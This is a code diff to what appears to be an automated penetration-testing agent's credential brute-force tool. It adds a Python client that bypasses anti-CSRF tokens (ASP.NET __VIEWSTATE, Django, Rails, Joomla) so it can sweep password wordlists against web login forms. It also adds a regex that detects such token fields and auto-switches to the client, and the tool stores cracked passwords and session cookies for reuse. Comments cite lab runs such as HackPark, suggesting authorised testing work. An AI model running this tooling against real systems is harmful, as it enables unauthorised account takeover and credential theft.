@@ -100,6 +100,14 @@ CRED_PROBE_USER_FALLBACK = "admin"
 CRED_PROBE_PASSWORD = "invalid_probe_12345"
 #: Budget of the probe: two requests, no sweep.
 CRED_PROBE_TIMEOUT_SECONDS = 20
+
+#: Hidden inputs that mean "this POST needs a token Hydra cannot refresh". The
+#: names cover ASP.NET WebForms, ASP.NET MVC, Rails, Django, Joomla and the
+#: generic ``csrf``/``_token`` spellings. A hidden ``return_url`` does not match.
+CRED_CSRF_FIELD_RE = re.compile(
+    r"(__viewstate|__eventvalidation|__requestverificationtoken|authenticity_token|_token|csrf)",
+    re.IGNORECASE,
+)
 #: Concurrent hydra tasks. Kept low to avoid tripping service rate limits.
 CRED_TASKS = 4
 
@@ -141,6 +149,30 @@ def cred_bruteforce_definition(tenant_id: str = "system") -> ToolDefinition:
                 "form_url": {"type": "string", "minLength": 1, "maxLength": 512},
                 "form_params": {"type": "string", "minLength": 1, "maxLength": 512},
                 "failure_string": {"type": "string", "minLength": 1, "maxLength": 200},
+                # Hydra cannot re-fetch a page per attempt, so a form protected by
+                # an ASP.NET __VIEWSTATE/__EVENTVALIDATION token (or any CSRF
+                # token) can never be swept by it: every POST is rejected before
+                # the credential is even tested. ``csrf_mode`` runs the same form
+                # sweep with the embedded client instead, fetching the tokens for
+                # every attempt.
+                "csrf_mode": {
+                    "type": "boolean",
+                    "description": (
+                        "Para formularios con token anti-CSRF (ASP.NET WebForms, "
+                        "Django, Rails, Joomla): barrido nativo que hace GET de la "
+                        "página en cada intento, extrae los <input type=hidden> y "
+                        "los inyecta en el POST. Con esto activo no se usa Hydra."
+                    ),
+                },
+                "csrf_form_url": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 2048,
+                    "description": (
+                        "URL (o ruta) de la página del formulario para el GET de "
+                        "csrf_mode cuando no coincide con target+form_url."
+                    ),
+                },
                 # One known-bad login before the sweep. It stops the run from
                 # spending its budget on a marker that cannot identify a failure
                 # (Brute It v6, iteration 8: 600 s with ``F=LOGIN``).
@@ -483,6 +515,7 @@ def _form_spec(form_url: Any, form_params: Any, failure_string: Any) -> str:
 #: next turns guessed (SSH, SQLi) instead of sweeping again.
 CRED_PROBE_SCRIPT = r'''
 import json, sys, urllib.error, urllib.parse, urllib.request
+from html.parser import HTMLParser
 
 class _NoRedirect(urllib.request.HTTPRedirectHandler):
     # A login answers 302 *with* the Set-Cookie. Following it silently kept only
@@ -495,6 +528,21 @@ OPENER = urllib.request.build_opener(_NoRedirect())
 
 def _cookies(headers):
     return [str(value) for value in (headers.get_all("Set-Cookie") or [])] if headers else []
+
+class _Hidden(HTMLParser):
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.names = []
+    def handle_starttag(self, tag, attrs):
+        values = {key.lower(): (value if value is not None else "") for key, value in attrs}
+        if tag.lower() == "input" and values.get("name"):
+            if values.get("type", "").lower() == "hidden":
+                self.names.append(values["name"])
+
+def hidden_names(page):
+    parser = _Hidden()
+    parser.feed(page or "")
+    return parser.names
 
 def fetch(url, method, body, timeout, cookie=None):
     data = body.encode("utf-8") if body else None
@@ -521,6 +569,13 @@ def main():
     baseline_url, method, action_url, body, needle, timeout = sys.argv[1:7]
     limit = float(timeout)
     baseline_status, baseline, _, baseline_location = fetch(baseline_url, "GET", "", limit)
+    # The page itself tells whether it is a token-protected form: if every POST
+    # needs a fresh __VIEWSTATE/CSRF value, Hydra cannot sweep it and the handler
+    # must switch to its token-aware client (run V10, HackPark, 2026-10-21).
+    try:
+        hidden_fields = hidden_names(baseline)
+    except Exception:
+        hidden_fields = []
     if baseline_location and 300 <= baseline_status < 400:
         # The anonymous page redirects to the real login form: that page is the
         # baseline the marker must *not* be in.
@@ -528,6 +583,10 @@ def main():
             urllib.parse.urljoin(baseline_url, baseline_location), "GET", "", limit
         )
         baseline += "\n" + landed_baseline
+        try:
+            hidden_fields = hidden_names(landed_baseline)
+        except Exception:
+            hidden_fields = hidden_fields
     failure_status, failure, set_cookie, location = fetch(action_url, method, body, limit)
     landed_status = failure_status
     if location and 300 <= failure_status < 400:
@@ -547,6 +606,7 @@ def main():
         "failure_status": failure_status,
         "in_baseline": needle in baseline,
         "in_failure": needle in failure,
+        "hidden_fields": hidden_fields,
         "baseline_len": len(baseline),
         "failure_len": len(failure),
         # The session the login just opened. Hydra validates the *password*; a
@@ -555,6 +615,186 @@ def main():
         # ``vault:443a…`` and no way to authenticate the panel).
         "set_cookie": set_cookie,
     }))
+
+try:
+    main()
+except Exception as exc:
+    print(json.dumps({"ok": False, "error": type(exc).__name__ + ": " + str(exc)[:200]}))
+'''
+
+
+#: The sweep hydra cannot do: a form that renders a fresh token per attempt.
+#:
+#: ``mode=probe`` performs the same two observations as ``CRED_PROBE_SCRIPT``
+#: (anonymous page vs one known-bad POST) but *through* the token flow, so the
+#: failure marker is validated against the request the sweep will actually make.
+#: ``mode=sweep`` walks the sliced wordlist, fetching the form and its hidden
+#: inputs for every password. Requests are sequential on purpose: ASP.NET ties
+#: the viewstate (and often the session) to the GET that issued it, and parallel
+#: attempts with a shared cookie jar would invalidate each other's tokens.
+CRED_CSRF_SCRIPT = r'''
+import json, sys, time, urllib.error, urllib.parse, urllib.request
+from html.parser import HTMLParser
+
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    allow_same_origin = False
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        if self.allow_same_origin:
+            old, new = urllib.parse.urlsplit(req.full_url), urllib.parse.urlsplit(newurl)
+            if (old.scheme, old.hostname, old.port) == (new.scheme, new.hostname, new.port):
+                return super().redirect_request(req, fp, code, msg, headers, newurl)
+        return None
+
+def _opener(follow):
+    handler = _NoRedirect()
+    handler.allow_same_origin = follow
+    return urllib.request.build_opener(handler)
+
+class _Hidden(HTMLParser):
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.fields = []
+    def handle_starttag(self, tag, attrs):
+        values = {key.lower(): (value if value is not None else "") for key, value in attrs}
+        if tag.lower() == "input" and values.get("name"):
+            if values.get("type", "").lower() == "hidden":
+                self.fields.append((values["name"], values.get("value", "")))
+
+def hidden_fields(page):
+    parser = _Hidden()
+    parser.feed(page or "")
+    return parser.fields
+
+def _set_cookies(headers):
+    return [str(value) for value in (headers.get_all("Set-Cookie") or [])] if headers else []
+
+def fetch(url, method, body, timeout, jar, follow):
+    data = body.encode("utf-8") if body else None
+    request = urllib.request.Request(url, data=data, method=method)
+    request.add_header("User-Agent", "nexus-csrf-form/1")
+    if jar:
+        request.add_header("Cookie", "; ".join("%s=%s" % item for item in jar.items()))
+    if data is not None:
+        request.add_header("Content-Type", "application/x-www-form-urlencoded")
+    try:
+        with _opener(follow).open(request, timeout=timeout) as response:
+            status = response.getcode()
+            text = response.read(300000).decode("utf-8", "replace")
+            cookies = _set_cookies(response.headers)
+            location = response.headers.get("Location") or ""
+    except urllib.error.HTTPError as exc:
+        status = exc.code
+        text = exc.read(300000).decode("utf-8", "replace")
+        cookies = _set_cookies(getattr(exc, "headers", None))
+        location = (exc.headers.get("Location") if exc.headers else "") or ""
+        exc.close()
+    for raw in cookies:
+        first = raw.split(";", 1)[0].strip()
+        name, separator, value = first.partition("=")
+        if separator and name:
+            jar[name.strip()] = value.strip()
+    return status, text, location
+
+def fill(template, username, password, hidden):
+    pairs = urllib.parse.parse_qsl(
+        template.replace("^USER^", username).replace("^PASS^", password),
+        keep_blank_values=True,
+    )
+    present = set(name for name, _ in pairs)
+    pairs.extend((name, value) for name, value in hidden if name not in present)
+    return urllib.parse.urlencode(pairs)
+
+def attempt(form_url, method, action_url, template, username, password, timeout, jar):
+    status, page, _ = fetch(form_url, "GET", "", timeout, jar, True)
+    hidden = hidden_fields(page)
+    body = fill(template, username, password, hidden)
+    if method == "GET":
+        target = action_url + ("&" if "?" in action_url else "?") + body
+        status, text, location = fetch(target, "GET", "", timeout, jar, False)
+    else:
+        status, text, location = fetch(action_url, "POST", body, timeout, jar, False)
+    if 300 <= status < 400 and location:
+        landed_status, landed, _ = fetch(
+            urllib.parse.urljoin(action_url, location), "GET", "", timeout, jar, False
+        )
+        text = text + "\n" + landed
+        status = landed_status
+    return status, text, hidden
+
+def main():
+    (mode, form_url, method, action_url, template, failure, username, wordlist,
+     budget, success_marker, progress_path, result_path) = sys.argv[1:13]
+    budget = float(budget)
+    per_request = min(10.0, budget)
+    jar = {}
+    if mode == "probe":
+        known_bad = "invalid_probe_12345"
+        baseline_status, baseline, _ = fetch(form_url, "GET", "", per_request, {}, True)
+        status, text, _ = attempt(
+            form_url, method, action_url, template, username, known_bad, per_request, {}
+        )
+        print(json.dumps({
+            "ok": True,
+            "baseline_status": baseline_status,
+            "failure_status": status,
+            "in_baseline": failure in baseline,
+            "in_failure": failure in text,
+        }))
+        return
+
+    started = time.time()
+    deadline = started + budget
+    with open(wordlist, encoding="utf-8", errors="replace") as handle:
+        passwords = [line.rstrip("\r\n") for line in handle if line.strip()]
+    total = len(passwords)
+    tested = 0
+    for password in passwords:
+        if time.time() >= deadline:
+            print(json.dumps({
+                "ok": True, "timed_out": True, "tested": tested, "total": total,
+                "password": None,
+            }))
+            return
+        status, text, hidden = attempt(
+            form_url, method, action_url, template, username, password, per_request, jar
+        )
+        tested += 1
+        success = failure not in text
+        if success and success_marker:
+            success = success_marker in text
+        if tested % 25 == 0:
+            try:
+                with open(progress_path, "w", encoding="utf-8") as handle:
+                    handle.write(json.dumps({
+                        "tested": tested, "total": total,
+                        "elapsed_seconds": round(time.time() - started, 1),
+                    }) + "\n")
+            except OSError:
+                pass
+        if success:
+            payload = {
+                "ok": True, "timed_out": False, "tested": tested, "total": total,
+                "password": password, "status": status,
+                "fields": [name for name, value in hidden],
+                "set_cookie": ["%s=%s" % item for item in jar.items()],
+            }
+            try:
+                with open(result_path, "w", encoding="utf-8") as handle:
+                    handle.write(json.dumps(payload) + "\n")
+            except OSError:
+                pass
+            print(json.dumps(payload))
+            return
+    payload = {
+        "ok": True, "timed_out": False, "tested": tested, "total": total,
+        "password": None, "elapsed_seconds": round(time.time() - started, 1),
+    }
+    try:
+        with open(result_path, "w", encoding="utf-8") as handle:
+            handle.write(json.dumps(payload) + "\n")
+    except OSError:
+        pass
+    print(json.dumps(payload))
 
 try:
     main()
@@ -599,6 +839,7 @@ def _probe_verdict(payload: dict[str, Any]) -> _ProbeVerdict:
     detail = {key: payload.get(key) for key in (
         "baseline_status", "failure_status", "in_baseline", "in_failure",
     )}
+    detail["hidden_fields"] = [str(name) for name in (payload.get("hidden_fields") or [])]
     if not payload.get("in_failure"):
         # Not in the response to a wrong credential: hydra would read every
         # attempt as a success and stop on the first one with a false positive.
@@ -750,6 +991,301 @@ async def _capture_form_session(
     }
 
 
+def _csrf_form_target(
+    value: Any, *, target: str, port: int, secure: bool, form_path: str
+) -> str:
+    """Return the absolute URL whose form issues the tokens.
+
+    A bare path is resolved against the scope-gated ``target``/port, exactly like
+    ``form_url``; a full URL is kept (including its query, which often carries
+    the ``ReturnURL`` the panel needs to render the form).
+    """
+    text = str(value or "").strip()
+    if not text:
+        return _probe_url(target, port, secure, form_path)
+    if "://" not in text:
+        return _probe_url(target, port, secure, text if text.startswith("/") else "/" + text)
+    parts = urlsplit(text)
+    if parts.scheme not in _FORM_URL_SCHEMES or not parts.hostname:
+        raise ToolInputError("csrf_form_url must be an http/https URL or a path")
+    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
+        raise ToolInputError("csrf_form_url contains control characters")
+    return text
+
+
+async def _csrf_form_observation(
+    mode: str,
+    *,
+    page_url: str,
+    action_url: str,
+    service: str,
+    form_params: str,
+    failure_string: str,
+    username: str,
+    wordlist_path: str,
+    budget_seconds: float,
+    workspace_root: str,
+    progress_path: str = "",
+    result_path: str = "",
+) -> tuple[dict[str, Any] | None, str]:
+    """Run one phase of the token-aware form client inside the sandbox."""
+    from .http_request import _parse_last_json
+
+    method = "GET" if service == "http-get-form" else "POST"
+    sandbox = sandbox_for_environment(workspace_root, allowed_programs=CRED_ALLOWED_PROGRAMS)
+    result = await run_in_sandbox(
+        sandbox,
+        [
+            "python3", "-c", CRED_CSRF_SCRIPT, mode, page_url, method, action_url,
+            form_params, failure_string, username, wordlist_path, str(budget_seconds),
+            "", progress_path, result_path,
+        ],
+        timeout_seconds=budget_seconds + 5,
+        image_env="NEXUS_HTTP_IMAGE",
+        default_image="python:3.12-alpine",
+    )
+    stdout = (result.stdout or "").strip()
+    payload: dict[str, Any] | None = None
+    if stdout:
+        try:
+            payload = _parse_last_json(stdout)
+        except ValueError:
+            payload = None
+    if payload is None and result_path and os.path.isfile(result_path):
+        try:
+            with open(result_path, encoding="utf-8", errors="replace") as handle:
+                payload = _parse_last_json(handle.read(1_000_000))
+        except (OSError, ValueError):
+            payload = None
+    if payload is None:
+        return None, "csrf_client_did_not_answer"
+    if not payload.get("ok"):
+        return None, str(payload.get("error") or "csrf_client_failed")[:200]
+    return payload, ""
+
+
+async def _probe_csrf_form_login(
+    *, page_url: str, action_url: str, service: str, form_params: str,
+    failure_string: str, username: str, workspace_root: str,
+) -> _ProbeVerdict:
+    """Validate the failure marker through the token flow.
+
+    The non-CSRF probe would POST without the tokens and read the panel's
+    "invalid token" page as the failure branch, which says nothing about the
+    credential marker. This one asks the same question the sweep will ask.
+    """
+    payload, reason = await _csrf_form_observation(
+        "probe",
+        page_url=page_url,
+        action_url=action_url,
+        service=service,
+        form_params=form_params,
+        failure_string=failure_string,
+        username=username,
+        wordlist_path="",
+        budget_seconds=CRED_PROBE_TIMEOUT_SECONDS,
+        workspace_root=workspace_root,
+    )
+    if payload is None:
+        return _ProbeVerdict("skipped", reason)
+    return _probe_verdict(payload)
+
+
+async def _csrf_form_sweep(
+    *,
+    context: RunContext,
+    target: str,
+    service: str,
+    port: int,
+    page_url: str,
+    action_url: str,
+    form_path: str,
+    form_params: str,
+    failure_string: str,
+    username: str,
+    wordlist_path: str,
+    attempts: int,
+    exhausted: bool,
+    start_at: int,
+    timeout_seconds: int,
+    workspace_root: str,
+    run_dir: str,
+    probe: _ProbeVerdict,
+    csrf_auto: bool = False,
+) -> ToolResult:
+    """Sweep a token-protected form with the embedded client (no hydra)."""
+    progress_path = os.path.join(run_dir, "csrf_progress.json")
+    result_path = os.path.join(run_dir, "csrf_result.json")
+    budget_seconds = max(10, timeout_seconds - 5)
+    payload, reason = await _csrf_form_observation(
+        "sweep",
+        page_url=page_url,
+        action_url=action_url,
+        service=service,
+        form_params=form_params,
+        failure_string=failure_string,
+        username=username,
+        wordlist_path=wordlist_path,
+        budget_seconds=budget_seconds,
+        workspace_root=workspace_root,
+        progress_path=progress_path,
+        result_path=result_path,
+    )
+    evidence: dict[str, Any] = {
+        "service": service,
+        "port": port,
+        "username": username,
+        "attempts": attempts,
+        "start_at": start_at,
+        "engine": "csrf-form-sweep",
+        "timeout_seconds": timeout_seconds,
+        "noise_level": "medium",
+        "form_url": form_path,
+        "failure_string_probe": probe.status,
+        "csrf_mode": True,
+        "csrf_auto": csrf_auto,
+    }
+    if probe.reason:
+        evidence["failure_string_probe_reason"] = probe.reason
+
+    if payload is None:
+        return ToolResult(
+            output={
+                "error": "the CSRF form client did not answer",
+                "reason": reason,
+                "target": target,
+                "service": service,
+                "port": port,
+            },
+            verified=False,
+            outcome="unavailable",
+            verification_method="cred_bruteforce_csrf_failed",
+            evidence=evidence,
+        )
+
+    tested = int(payload.get("tested") or 0)
+    timed_out = bool(payload.get("timed_out"))
+    password = str(payload.get("password") or "")
+    fields = [str(name) for name in (payload.get("fields") or [])]
+    evidence.update({
+        "tested": tested,
+        "next_start_at": start_at + tested,
+        "wordlist_completed": (exhausted and not timed_out and tested >= attempts),
+        "found_count": 1 if password else 0,
+        "csrf_fields": fields,
+    })
+
+    if timed_out and not password:
+        return ToolResult(
+            output={
+                "error": "credential testing timed out",
+                "aborted": "time_cap",
+                "message": (
+                    f"El barrido de formulario con CSRF se cortó a los "
+                    f"{timeout_seconds}s sin credencial válida ({tested} intentos). "
+                    "No es un veredicto sobre el objetivo: sube timeout_seconds, "
+                    "baja max_attempts (el barrido va por slices con start_at) o "
+                    "cambia de vector."
+                ),
+                "target": target,
+                "service": service,
+                "port": port,
+                "attempts": attempts,
+                "tested": tested,
+            },
+            verified=False,
+            outcome="timeout",
+            verification_method="cred_bruteforce_csrf_timeout",
+            evidence=evidence,
+            stdout=payload.get("error"),
+            timed_out=True,
+        )
+
+    raw_credentials = (
+        [{"username": username, "password": password, "service": service}]
+        if password else []
+    )
+    stored = store_discovered_credentials(raw_credentials, tenant_id=context.tenant_id)
+    evidence["secret_refs"] = [
+        entry["secret_ref"] for entry in stored if entry.get("secret_ref")
+    ]
+    session: dict[str, Any] | None = None
+    if stored:
+        raw_cookies = [str(value) for value in payload.get("set_cookie") or ()]
+        header = _cookie_header(raw_cookies)
+        names = _cookie_names(raw_cookies)
+        if header:
+            ref = default_secret_store().put(
+                header.encode("utf-8"), kind="session", tenant_id=context.tenant_id
+            )
+            session = {
+                "verified": True,
+                "session_ref": ref,
+                "cookies": names,
+                "status": payload.get("status"),
+                "usage": (
+                    "nexus.web.request con session_ref=<handle> reutiliza esta "
+                    "sesión; no hace falta la contraseña."
+                ),
+            }
+        else:
+            session = {
+                "verified": True,
+                "reason": "no_set_cookie",
+                "cookies": [],
+                "status": payload.get("status"),
+            }
+
+    partial = not stored and not timed_out and not exhausted
+    negative = not stored and not timed_out and exhausted
+    if negative:
+        _record_brute_barrier(
+            context,
+            target=target,
+            port=port,
+            reason=(
+                f"fuerza bruta {service} (csrf) sobre {target}:{port} sin "
+                f"credencial válida tras {tested} intentos ({timeout_seconds}s)"
+            ),
+            detail={"service": service, "attempts": tested, "csrf_mode": True},
+        )
+
+    output: dict[str, Any] = {
+        "target": target,
+        "service": service,
+        "port": port,
+        "username": username,
+        "attempts": attempts,
+        "tested": tested,
+        "start_at": start_at,
+        "next_start_at": start_at + tested,
+        "wordlist_completed": (exhausted and not timed_out and tested >= attempts),
+        "valid_credentials": stored,
+        "engine": "csrf-form-sweep",
+        "csrf_fields": fields,
+    }
+    if session is not None:
+        output["session"] = session
+    if negative:
+        output["message"] = (
+            "El barrido con CSRF completó la wordlist sin credenciales válidas"
+        )
+    elif partial:
+        output["message"] = (
+            f"Slice sin acierto: {tested} entradas desde el offset {start_at} y la "
+            "wordlist tiene más. Repite con "
+            f"start_at={start_at + tested} para el siguiente slice."
+        )
+    return ToolResult(
+        output=output,
+        verified=bool(stored),
+        outcome="" if stored else ("partial" if partial else ("negative" if negative else "")),
+        verification_method="cred_bruteforce_csrf_completed",
+        evidence=evidence,
+        stdout=_scrub_plaintext(payload.get("error") or "", raw_credentials),
+    )
+
+
 def _invalid_failure_string_result(
     *, target: str, service: str, port: int, form_path: str,
     failure_string: str, probe: _ProbeVerdict,
@@ -880,6 +1416,16 @@ async def cred_bruteforce_handler(arguments: dict[str, Any], context: RunContext
         failure_string = str(arguments.get("failure_string") or "").strip()
         form_spec = _form_spec(form_path, form_params, failure_string)
 
+    # ``csrf_mode`` is only meaningful for a form: it replaces hydra with the
+    # token-aware client. A flag on ssh/ftp would be a silent no-op, so it is
+    # rejected instead of ignored.
+    csrf_mode = bool(arguments.get("csrf_mode", False))
+    csrf_form_raw = str(arguments.get("csrf_form_url") or "").strip()
+    if csrf_mode and service not in CRED_FORM_SERVICES:
+        raise ToolInputError("csrf_mode requires service=http-post-form or http-get-form")
+    if csrf_form_raw and not csrf_mode:
+        raise ToolInputError("csrf_form_url requires csrf_mode=true")
+
     # ``form_url`` may repeat the host and the port the call already carries. hydra
     # always connects to ``target`` -the scope-gated field-, so a URL naming another
     # host is a modelling slip, not a second objective: its route is still used,
@@ -898,6 +1444,13 @@ async def cred_bruteforce_handler(arguments: dict[str, Any], context: RunContext
     if not 1 <= port <= 65535:
         raise ToolInputError("port out of range")
     secure = (secure and same_host) or port in CRED_SSL_PORTS
+    csrf_page_url = ""
+    form_action_url = ""
+    if csrf_mode:
+        form_action_url = _probe_url(target, port, secure, form_path)
+        csrf_page_url = _csrf_form_target(
+            csrf_form_raw, target=target, port=port, secure=secure, form_path=form_path
+        )
     # No cap of the handler's own: ``max_attempts`` cuts the list only when the
     # caller asks for it, and ``timeout_seconds`` is the caller's or the budget the
     # tool's contract publishes. The TCP script keeps its own (smaller) budget
@@ -923,11 +1476,42 @@ async def cred_bruteforce_handler(arguments: dict[str, Any], context: RunContext
     # before the wordlist is copied, so a bad marker costs 2 requests, not the
     # copy of a 14M-line dictionary.
     probe = _ProbeVerdict("disabled", "not_a_form_service")
+    csrf_auto = False
     if form_spec and bool(arguments.get("probe", True)):
-        probe = await _probe_form_login(
-            target=target, port=port, secure=secure, path=form_path,
+        if csrf_mode:
+            probe = await _probe_csrf_form_login(
+                page_url=csrf_page_url, action_url=form_action_url, service=service,
+                form_params=form_params, failure_string=failure_string,
+                username=username, workspace_root=workspace_root,
+            )
+        else:
+            probe = await _probe_form_login(
+                target=target, port=port, secure=secure, path=form_path,
+                form_params=form_params, failure_string=failure_string,
+                username=username, service=service, workspace_root=workspace_root,
+            )
+    # The page already told us it needs tokens: switch to the token-aware sweep
+    # instead of letting Hydra burn the wordlist on requests the panel rejects
+    # before it even reads the password (run V10, iteration 12).
+    if (
+        not csrf_mode
+        and form_spec
+        and probe.status != "disabled"
+        and any(
+            CRED_CSRF_FIELD_RE.search(str(name))
+            for name in probe.detail.get("hidden_fields") or []
+        )
+    ):
+        csrf_mode = True
+        csrf_auto = True
+        form_action_url = _probe_url(target, port, secure, form_path)
+        csrf_page_url = _csrf_form_target(
+            "", target=target, port=port, secure=secure, form_path=form_path
+        )
+        probe = await _probe_csrf_form_login(
+            page_url=csrf_page_url, action_url=form_action_url, service=service,
             form_params=form_params, failure_string=failure_string,
-            username=username, service=service, workspace_root=workspace_root,
+            username=username, workspace_root=workspace_root,
         )
     if probe.status == "invalid":
         return _invalid_failure_string_result(
@@ -947,6 +1531,29 @@ async def cred_bruteforce_handler(arguments: dict[str, Any], context: RunContext
             f"password_file has no usable entries at offset {start_at}"
             if start_at
             else "password_file has no usable entries"
+        )
+
+    if csrf_mode:
+        return await _csrf_form_sweep(
+            context=context,
+            target=target,
+            service=service,
+            port=port,
+            page_url=csrf_page_url,
+            action_url=form_action_url,
+            form_path=form_path,
+            form_params=form_params,
+            failure_string=failure_string,
+            username=username,
+            wordlist_path=wordlist_path,
+            attempts=attempts,
+            exhausted=exhausted,
+            start_at=start_at,
+            timeout_seconds=timeout_seconds,
+            workspace_root=workspace_root,
+            run_dir=run_dir,
+            probe=probe,
+            csrf_auto=csrf_auto,
         )
 
     if service in {"tcp", "telnet"}:
